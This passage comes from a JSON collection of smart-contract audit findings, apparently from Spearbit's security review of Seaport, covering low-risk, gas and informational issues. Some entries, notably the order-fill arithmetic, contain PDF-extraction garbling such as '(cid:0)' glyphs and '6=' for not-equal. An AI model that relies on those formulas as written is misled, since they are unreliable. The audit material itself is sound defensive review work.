        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When _contractNonces[offerer] gets updated no event is emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When _contractNonces[offerer] gets updated no event is emitted. This is in contrast to when a counter is updated. One might be able to extract the _contractNonces[offerer] (if it doesn't overflow 12 bytes to enter into the offerer region in the orderhash) from a later event when OrderFulfilled gets emited. OrderFulfilled only gets emitted for an order of CONTRACT type if the generateOrder(...)'s return data satisffies all the constraints.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In general a contract offerer or a zone cannot draw a conclusion accurately based on the spent offer amounts or received consideration amounts shared with them post-trasnfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When one calls one of the Seaport endpoints that fulfills or matches a collection of (advanced) orders, the used offer or consideration items will go through different modification steps in the memory. In particular, the startAmount a of these items is an important parameter to inspect: a ! a0 ! b ! a0 a : original startAmount parameter shared to Seaport by the caller encoded in the memory. a0 : the interpolated value and for orders of CONTRACT order type it is the value returned by the contract offerer (interpolation does not have an effect in this case since the startAmount and endAmount are enforced to be equal). b : must be 0 for used consideration items, otherwise the call would revert. For offer items, it can be in [0, 1) (See The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general). a0 : is the final amount shared by Seaport to either a zone for restricted orders and a contract offerer for CONTRACT order types.  Offer Items For offer items, perhaps the zone or the contract offerer would like to check that the offerer has spent a maxi- mum a0 of that specific offer item. For the case of restricted orders where the zone's validateOrder(...) will be called, the offerer might end up spending more than a0 amount of a specific token with the same identifier if the collection of orders includes:  A mix of open and restricted orders.  Multiple zones for the same offerer, offering the same token with the same identifier.  Multiple orders using the same zone. In this case, the zone might not have a sense of the orders of the transfers or which orders are included in the transaction in question (unless the contexts used by the zone enforces the exact ordering and number of items that can be matched/fulfilled in the same transaction). Note the order of transfers can be manipulated/engineered by constructing specific fulfillment data. Given a fulfillment data to combine/aggregate orders, there could be permutations of it that create different ordering of the executions.  An order with an actor (a consideration recipient, contract offerer, weird token, ...) that has approval to transfer this specific offer item for the offerer in question. And when Seaport calls into (NATIVE, ERC1155 token transfers, ...) this actor, the actor would transfer the token to a different address than the offerer. There also is a special case where an order with the same offer item token and identifier is signed on a different instance of Seaport (1.0, 1.1, 1.2, ..., or other non-official versions) which an actor (a consideration recipient, con- tract offerer, weird token, ...) can cross-call into (related Cross-Seaport re-entrancy with the stateful validateOrder call). The above issue can be avoided if the offerer makes sure to not sign different transactions across different or the same instances of Seaport which 1. Share the same offer type, offer token, and offer identifier, 2. but differ in a mix of zone, and order type 24 3. can be active at a shared timestamp And/or the offerer does not give untrusted parties their token approvals. A similar issue can arise for a contract offerer if they use a mix of signed orders of non-CONTRACT order type and CONTRACT order types.  Consideration Items For consideration items, perhaps the zone or the contract offerer would like to check that the recipient of each consideration item has received a minimum of a0 of that specific consideration item. This case also is similar to the offer items issues above when a mix of orders has been used.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cross-Seaport re-entrancy with the stateful validateOrder call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The re-entrancy check in Seaport 1.2 will prevent the Zone from interacting with Seaport 1.2 again. However, an interesting scenario would happen when if the conduit has open channels to both Seaport 1.1 and Seaport 1.2 (or different deployments/forks of Seaport 1.2). This can lead to cross Seaport re-entrancy. This is not immediately problematic as Zones have limited functionality currently. But since Zones can be as flexible as possible, Zones need to be careful if they can interact with multiple versions of Seaport. Note: for Seaport 1.1's zone, the check _assertRestrictedBasicOrderValidity happens before the transfers, and it's also a staticcall. In the future, Seaport 1.3 could also have the same zone interaction, i.e., stateful calls to zones allowing for complex cross-Seaport re-entrancy between 1.2 and 1.3. Note: also see getOrderStatus and getContractOffererNonce are prone to view reentrancy for concerns around view-only re-entrancy.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getOrderStatus and getContractOffererNonce are prone to view reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Nonces[offerer] gets updated if there is a mix of contract offerer orders and partial orders are used, Seaport would call into the offerer contracts (let's call one of these offerer contracts X ). In turn X can be a contract that would call into other contracts (let's call them Y ) that take into consideration _orderStatus[orderHash] or _contractNonces[offerer] in their codebase by calling getOrderStatus or getContractOffererNonce The values for _orderStatus[orderHash] or _contractNonces[offerer] might get updated after Y seeks those from Seaport due to for example multiple partial orders with the same orderHash or multiple offerer contract orders using the same offerer. Therefore Y would only take into consideration the mid-flight values and not the final ones after the whole transaction with Seaport is completed.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The size calculation can be incorrect for large numbers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The maximum value of memory offset is defined in PointerLibraries.sol#L22 as OffsetOr- LengthMask = 0xffffffff, i.e., 232 (cid:0) 1. However, the mask OnlyFullWordMask = 0xffffe0; is defined to be a 24-bit number. Assume that the length of the bytes type where src points is 0xffffe0, then the following piece of code incorrectly computes the size as 0. function abi_encode_bytes( MemoryPointer src, MemoryPointer dst ) internal view returns (uint256 size) { unchecked { size = ((src.readUint256() & OffsetOrLengthMask) + AlmostTwoWords) & OnlyFullWordMask; ... This is because the constant OnlyFullWordMask does not have the two higher order bytes set (as a 32-bit type). Note: in practice, it can be difficult to construct bytes of length 0xffffe0 due to upper bound defined by the block gas limit. However, this length is still below Seaport's OffsetOrLengthMask, and therefore may be able to evade many checks. 26",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_prepareBasicFulfillmentFromCalldata expands memory more than it's needed by 4 extra words",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In _prepareBasicFulfillmentFromCalldata , we have: // Update the free memory pointer so that event data is persisted. mstore(0x40, add(0x80, add(eventDataPtr, dataSize))) OrderFulfilled's event data is stored in the memory in the region [eventDataPtr, eventDataPtr + dataSize). It's important to note that eventDataPtr is an absolute memory pointer and not a relative one. So the above 4 words, 0x80, in the snippet are extra. example, For in test/basic.spec.ts the Seaport memory profile at tract.connect(buyer).fulfillBasicOrder(basicOrderParameters, {value,}) looks like: \"ERC721 <=> ETH (basic, minimal and verified on-chain)\" case the call of marketplaceCon- the end of test the in 28 0x000 23b872dd000000000000000000000000f372379f3c48ad9994b46f36f879234a ; transferFrom.selector(from, to, id) ,! 0x020 27b4556100000000000000000000000016c53175c34f67c1d4dd0878435964c1 ; ... 0x040 0000000000000000000000000000000000000000000000000000000000000440 ; free memory pointer 0x060 0000000000000000000000000000000000000000000000000000000000000000 ; ZERO slot 0x080 fa445660b7e21515a59617fcd68910b487aa5808b8abda3d78bc85df364b2c2f ; orderTypeHash 0x0a0 000000000000000000000000f372379f3c48ad9994b46f36f879234a27b45561 ; offerer 0x0c0 0000000000000000000000000000000000000000000000000000000000000000 ; zone 0x0e0 78d24b64b38e96956003ddebb880ec8c1d01f333f5a4bfba07d65d5c550a3755 ; h(ho) 0x100 81c946a4f4982cb7ed0c258f32da6098760f98eaf6895d9ebbd8f9beccb293e7 ; h(hc, ha[0], ..., ha[n]) 0x120 0000000000000000000000000000000000000000000000000000000000000000 ; orderType 0x140 0000000000000000000000000000000000000000000000000000000000000000 ; startTime 0x160 000000000000000000000000000000000000ff00000000000000000000000000 ; endTime 0x180 8f1d378d2acd9d4f5883b3b9e85385cf909e7ab825b84f5a6eba28c31ea5246a ; zoneHash > orderHash 0x1a0 00000000000000000000000016c53175c34f67c1d4dd0878435964c1c9b70db7 ; salt > fulfiller 0x1c0 0000000000000000000000000000000000000000000000000000000000000080 ; offererConduitKey > offerer array head ,! 0x1e0 0000000000000000000000000000000000000000000000000000000000000120 ; counter[offerer] > consideration array head ,! 0x200 0000000000000000000000000000000000000000000000000000000000000001 ; h[4]? > offer.length 0x220 0000000000000000000000000000000000000000000000000000000000000002 ; h[...]? > offer.itemType 0x240 000000000000000000000000c67947dc8d7fd0c2f25264f9b9313689a4ac39aa ; > offer.token 0x260 00000000000000000000000000000000c02c1411443be3c204092b54976260b9 ; > offer.identifierOrCriteria 0x280 0000000000000000000000000000000000000000000000000000000000000001 ; > offer's current interpolated amount ,! 0x2a0 0000000000000000000000000000000000000000000000000000000000000001 ; > totalConsiderationRecipients + 1 ,! 0x2c0 0000000000000000000000000000000000000000000000000000000000000000 ; > receivedItemType 0x2e0 0000000000000000000000000000000000000000000000000000000000000000 ; > consideration.token (NATIVE) 0x300 0000000000000000000000000000000000000000000000000000000000000000 ; > consideration.identifierOrCriteria ,! 0x320 0000000000000000000000000000000000000000000000000000000000000001 ; > consideration's current interpolated amount ,! 0x340 000000000000000000000000f372379f3c48ad9994b46f36f879234a27b45561 ; > offerer 0x360 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x380 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3a0 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3c0 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3e0 0000000000000000000000000000000000000000000000000000000000000040 ; sig.length 0x400 26aa4a333d4b615af662e63ce7006883f678068b8dc36f53f70aa79c28f2032c ; sig[ 0:31] 0x420 f640366430611c54bafd13314285f7139c85d69f423794f47ee088fc6bfbf43f ; sig[32:63] 0x440 0000000000000000000000000000000000000000000000000000000000000001 ; fulfilled = 1; // returns ,! (bool fulfilled) Notice that 4 unused memory slots.  Transaction Trace This is also a good example to see that certain memory slots that previously held values like zoneHash, salt, ... have been overwritten to due to the small number of consideration items (this actually happens inside _- prepareBasicFulfillmentFromCalldata).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TypehashDirectory's constructor code can be optimized.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "TypehashDirectory's deployed bytecode in its current form is: 00 3ca2711d29384747a8f61d60aad3c450405f7aaff5613541dee28df2d6986d32 ; h_00 bf8e29b89f29ed9b529c154a63038ffca562f8d7cd1e2545dda53a1b582dde30 ; h_01 53c6f6856e13104584dd0797ca2b2779202dc2597c6066a42e0d8fe990b0024d ; h_02 a02eb7ff164c884e5e2c336dc85f81c6a93329d8e9adf214b32729b894de2af1 ; h_03 39c9d33c18e050dda0aeb9a8086fb16fc12d5d64536780e1da7405a800b0b9f6 ; h_04 1c19f71958cdd8f081b4c31f7caf5c010b29d12950be2fa1c95070dc47e30b55 ; h_05 ca74fab2fece9a1d58234a274220ad05ca096a92ef6a1ca1750b9d90c948955c ; h_06 7ff98d9d4e55d876c5cfac10b43c04039522f3ddfb0ea9bfe70c68cfb5c7cc14 ; h_07 bed7be92d41c56f9e59ac7a6272185299b815ddfabc3f25deb51fe55fe2f9e8a ; h_08 d1d97d1ef5eaa37a4ee5fbf234e6f6d64eb511eb562221cd7edfbdde0848da05 ; h_09 896c3f349c4da741c19b37fec49ed2e44d738e775a21d9c9860a69d67a3dae53 ; h_10 bb98d87cc12922b83759626c5f07d72266da9702d19ffad6a514c73a89002f5f ; h_11 e6ae19322608dd1f8a8d56aab48ed9c28be489b689f4b6c91268563efc85f20e ; h_12 6b5b04cbae4fcb1a9d78e7b2dfc51a36933d023cf6e347e03d517b472a852590 ; h_13 d1eb68309202b7106b891e109739dbbd334a1817fe5d6202c939e75cf5e35ca9 ; h_14 1da3eed3ecef6ebaa6e5023c057ec2c75150693fd0dac5c90f4a142f9879fde8 ; h_15 eee9a1392aa395c7002308119a58f2582777a75e54e0c1d5d5437bd2e8bf6222 ; h_16 c3939feff011e53ab8c35ca3370aad54c5df1fc2938cd62543174fa6e7d85877 ; h_17 0efca7572ac20f5ae84db0e2940674f7eca0a4726fa1060ffc2d18cef54b203d ; h_18 5a4f867d3d458dabecad65f6201ceeaba0096df2d0c491cc32e6ea4e64350017 ; h_19 80987079d291feebf21c2230e69add0f283cee0b8be492ca8050b4185a2ff719 ; h_20 3bd8cff538aba49a9c374c806d277181e9651624b3e31111bc0624574f8bca1d ; h_21 5d6a3f098a0bc373f808c619b1bb4028208721b3c4f8d6bc8a874d659814eb76 ; h_22 1d51df90cba8de7637ca3e8fe1e3511d1dc2f23487d05dbdecb781860c21ac1c ; h_23 for height 24",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ConsiderationItem.recipient's absolute memory offset can be cached and reused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ConsiderationItem.recipient's absolute offset is calculated twice in the above context.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "currentAmount can potentially be reused when storing this value in memory in _validateOrdersAnd- PrepareToFulfill",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "We have considerationItem.startAmount = currentAmount; // 1 ... mload( // 2 add( considerationItem, ReceivedItem_amount_offset ) ) From 1 where considerationItem.startAmount is assigned till 2 its value is not modifed.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Information packed in BasicOrderType and how receivedItemType and offeredItemType are derived",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Currently the way information is packed and unpacked in/from BasicOrderType is inefficient. Basi- cOrderType is only used for BasicOrderParameters and when unpacking to give an idea how diffferent parameters are packed into this field.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "invalidNativeOfferItemErrorBuffer calculation can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "We have: func sig ------------------------------------------------------------------------------ 0b10101000000101110100010 00 0000100 0b01010101100101000100101 00 1000010 0b11101101100110001010010 10 1110100 0b10000111001000000001101 10 1000001 ^ 9th bit matchOrders matchAdvancedOrders fulfillAvailableOrders fulfillAvailableAdvancedOrders",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "When accessing or writing to memory the value of an enum for a struct field, the enum's validation is performed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When accessing or writing to memory the value of an enum type for a struct field, the enum's validation is performed: enum Foo { f1, f2, ... fn } struct boo { Foo foo; ... } boo memory b; P(b.foo); // <--- validation will be performed to check whether the value of `b.foo` is out of range This would apply to OrderComponents.orderType, OrderParameters.orderType, CriteriaResolver.side, ReceivedItem.itemType, OfferItem.itemType, BasicOrderParameters.basicOrderType. ConsiderationItem.itemType, SpentItem.itemType,",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The zero memory slot can be used when supplying no criteria to fulfillOrder, fulfillAvailable- Orders, and matchOrders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When the external functions in this context are called, no criteria is passed to _validateAndFulfil- lAdvancedOrder, _fulfillAvailableAdvancedOrders, or _matchAdvancedOrders: new CriteriaResolver[](0), // No criteria resolvers supplied. When this gets compiled into YUL, the compiler updates the free memory slot by a word and performs an out of range and overflow check for this value: 34 function allocate_memory_<ID>() -> memPtr { memPtr := mload(64) let newFreePtr := add(memPtr, 32) if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() } mstore(64, newFreePtr) }",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "matchOrders, matchAdvancedOrders, fulfillAvailableAdvancedOrders, fulfillAvailableOrders re- turns executions which is cleaned and validator by the compiler",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Currently, the return values of matchOrders, matchAdvancedOrders, fulfillAvailableAdvance- dOrders, fulfillAvailableOrders are cleaned and validator by the compiler.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "abi.encodePacked is used when only bytes/string concatenation is needed.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the context above, one is using abi.encodePacked like the following: 35 bytes memory B = abi.encodePacked( \"<B1>\", \"<B2>\", ... \"<Bn>\" ); For each substring, this causes the compiler to use an mstore (if the substring occupies more than 32 bytes, it will use the least amount of mstores which is the ceiling of the length of substring divided by 32), even though multiple substrings can be combined to fill in one memory slot and thus only use 1 mstore for those.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "solc ABI encoder is used when OrderFulfilled is emitted in _emitOrderFulfilledEvent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "solc's ABI encoder is used when OrderFulfilled is emitted in _emitOrderFulfilledEvent. That means all the parameters are cleaned and validated before they are provided to log3.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The use of identity precompile to copy memory need not be optimal across chains",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The PointerLibraries contract uses a staticcall to identity precompile, i.e., address 4 to copy memory--poor man's memcpy. This is used as a cheaper alternative to copy 32-byte chunks of memory using mstore(...) in a for-loop. However, the gas efficiency of the identity precompile relies on the version of the EVM on the underlying chain. The base call cost for precompiles before Berlin hardfork was 700 (from Tangerine Wistle), and after Berlin, this was reduced to 100 (for warm accounts and precompiles). Many EVM compatible L1s, and even L2s are on old EVM versions. And using the identity precompile would be more expensive than doing mstores(...).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use the zero memory slot for allocating empty data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In cases where an empty data needs to be allocated, one can use the zero slot. This can also be used as initial values for offer and consideration in abi_decode_generateOrder_returndata.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Some address fields are masked even though the ConsiderationDecoder wanted to skip this mask- ing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When a field of address type from a struct in memory is used, the compiler masks (also: 2, 3) it. struct A { address addr; } A memory a; // P is either a statement or a function call // when compiled --> and(mload(a_addr_pos), 0xffffffffffffffffffffffffffffffffffffffff) P(a.addr); Also the compiler is making use of function cleanup_address(value) -> cleaned { cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff) } function abi_encode_address(value, pos) { mstore(pos, and(value, 0xffffffffffffffffffffffffffffffffffffffff)) } in a few places",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "div(x, (1<<n)) can be transformed into shr(n, x)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The above context, one is dividing a number by a constant which is power of 2: div(x, c) // where c = 1 << n One can perform the same operation using shr which cost less gas.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use fallback() to circumvent Solidity's dispatcher mechanism",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Among other things, the optimization steps are adding extra byte codes that are unnecessary for the dispatching mechanism. For example the Expression Simplifer is transforming the following calldata size comparisons: // slt(sub(calldatasize(), 4), X) push1 0x4 calldatasize sub slt into: // slt(add(calldatasize(), 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc), X) push32 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc calldatasize add slt And this happens for each exposed endpoint. This particular optimization rule is helpful if one could reorder and combine the constant value with another one ( A + (X (cid:0) B) ! (A (cid:0) B) + X , here A, B are constants and X is a variable ). But in this particular instance, the dispatcher does not perform better or worse in regards to the runtime code gas (it stays the same) but the optimization grows the bytecode size.  Note: The final bytecode depends on the options provided to solc. For the above finding, the default hardhat settings is used without the NO_SPECIALIZER flag.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The arithmetic in _validateOrderAndUpdateStatus can be simplified/optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "orderStatus.numerator and orderStatus.denominator contains multiple nested if/else blocks and for certain conditions/paths extra operations are performed. advancedOrder.numerator, arithmetic involving The variable description na advancedOrder.numerator 46 variable description da ns ds advancedOrder.denominator orderStatus.numerator orderStatus.denominator Depending on the case, the final outputs need to be:  Case 1. ds = 0 In this case na, da will be unmodified (besides the constraint checks)  Case 2. ds 6= 0, da = 1 In this case the remaining of the order will be filled and we would have (na, ns, da, ds) = (na, na, da, da) (na, ns, da, ds) = (ds (cid:0) ns, ds, ds, ds) Note that the invariant d (cid:21) n for new fractions and the combined ones is always guaranteed and so ds (cid:0) ns would not underflow.  Case 3. ds 6= 0, da 6= 1, da = ds Below (cid:15) = (na + ns > ds)(na + ns (cid:0) ds) is choosen so that order would not be overfilled. The parameters used in calculating (cid:15) are taken before they have been updated.  Case 4. ds 6= 0, da 6= 1, da 6= ds (na, ns, da, ds) = (na (cid:0) (cid:15), na + ns (cid:0) (cid:15), ds, ds) Below (cid:15) = (nads + nsda > dads)(nads + nsda (cid:0) dads) is choosen so that order would not be overfilled. And in case the new values go beyond 120 bits, G = gcd(nads (cid:0) (cid:15), nads + nsda (cid:0) (cid:15), dads), otherwise G will be 1. The parameters used in calculating (cid:15), G are taken before they have been updated. (na, ns, da, ds) = 1 G (nads (cid:0) (cid:15), nads + nsda (cid:0) (cid:15), dads, dads) If one of the updated values occupies more than 120 bits, the call will be reverted.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The magic return value checks can be made stricter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The magic return value check for ZoneInteraction can be made stricter. 1. It does not check the lower 28 bytes of the return value. 2. It does not check if extcodesize() of the zone is non-zero. In particular, for the identity precompile, the magic check would pass. This is, however, a general issue with the pattern where magic values are the same as the function selector and not specific to the Zone.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Resolving additional offer items supplied by contract orders with criteria can be impractical",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Contract orders can supply additional offer amounts when the order is executed. However, if they supply extra offer items with criteria, on the fly, the fulfiller won't be able to supply the necessary criteria resolvers (the correct Merkle proofs). This can lead to flaky orders that are impractical to fulfill.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of confusing named constant SpentItem_size in a function that deals with only ReceivedItem",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The named constant SpentItem_size is used in the function copyReceivedItemsAsConsidera- tionItems, even though the context has nothing to do with SpentItem.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The ABI-decoding of generateOrder returndata does not have sufficient checks to prevent out of bounds returndata reads",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There was some attempt to avoid out of bounds returndata access in the ConsiderationDecoder. However, the two returndatacopy(...) in ConsiderationDecoder.sol#L456-L461 can still lead to out of bounds access and therefore may revert. Assume that code reaches the line ConsiderationDecoder.sol#L456. We have the following constraints 1. returndatasize >= 4 * 32: ConsiderationDecoder.sol#L428 2. offsetOffer <= returndatasize: ConsiderationDecoder.sol#L444 3. offsetConsideration <= returndatasize: ConsiderationDecoder.sol#L445 If we pick a returndata that satisfies 1 and let offsetOffer == offsetConsideration == returndatasize, all the constraints are true. But the returndatacopy would be revert due to an out-of-bounds read. Note: High-level Solidity avoids reading from out of bounds returndata. This is usually done by checking if re- turndatasize() is large enough for static data types and always doing returndatacopy of the form returndata- copy(x, 0, returndatasize()).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming writeBytes to writeBytes32",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The function name writeBytes is not accurate in this context.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing test case for criteria-based contract orders and identifierOrCriteria != 0 case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The only test case for criteria-based contract orders in advanced.spec.ts#L434. This tests the case for identifierOrCriteria == 0. For the other case, identifierOrCriteria != 0 tests are missing.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "NatSpec comment for conduitKey in bulkTransfer() says \"optional\" instead of \"mandatory\"",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The NatSpec comment says that conduitKey is optional but there is a check making sure that this value is always supplied.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comparing the magic values returned by different contracts are inconsistent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In ZoneInteraction's _callAndCheckStatus we perform the following comparison for the returned magic value: let magic := shr(224, mload(callData)) magicMatch := eq(magic, shr(224, mload(0))) But the returned magic value comparison in _assertValidSignature without truncating the returned value: if iszero(eq(mload(0), EIP1271_isValidSignature_selector))",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the structure of the TypehashDirectory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Instances of TypehashDirectory would act as storage contracts with runtime bytecode: [0x00 - 0x00] 00 [0x01 - 0x20] h(struct BulkOrder { OrderComponents[2] [0x21 - 0x40] h(struct BulkOrder { OrderComponents[2][2] ... [0xNN - 0xMM] h(struct BulkOrder { OrderComponents[2][2]...[2] tree }) tree }) tree }) 56 h calculates the eip-712 typeHash of the input struct. 0xMM would be mul(MaxTreeHeight, 0x20) and 0xNN = 0xMM - 0x1f.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what twoSubstring encodes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "We have: bytes32 constant twoSubstring = 0x5B325D0000000000000000000000000000000000000000000000000000000000; which encodes: cast --to-ascii 0x5B325D0000000000000000000000000000000000000000000000000000000000 [2]",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Upper bits of the to parameter to call opcodes are stripped out by clients",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Upper bits of the to parameter to call opcodes are stripped out by clients. For example, geth would strip the upper bytes out:  instructions.go#L674  uint256.go#L114-L121 So even though the to parameters in this context can have dirty upper bits, the call opcodes can be successful, and masking these values in the contracts is not necessary for this context.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The functions in the above context are not used in the codebase.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fulfillment_itemIndex_offset can be used instead of OneWord",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the above context, one has: // Get the item index using the fulfillment pointer. itemIndex := mload(add(mload(fulfillmentHeadPtr), OneWord))",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document how the _pauser role is assigned for PausableZoneController",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The _pauser role is an important role for a PausableZoneController. It can pause any zone created by this controller and thus transfer all the native token funds locked in that zone to itself.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "_aggregateValidFulfillmentConsiderationItems's memory layout assumptions depend on _val- idateOrdersAndPrepareToFulfill's memory manipulation",
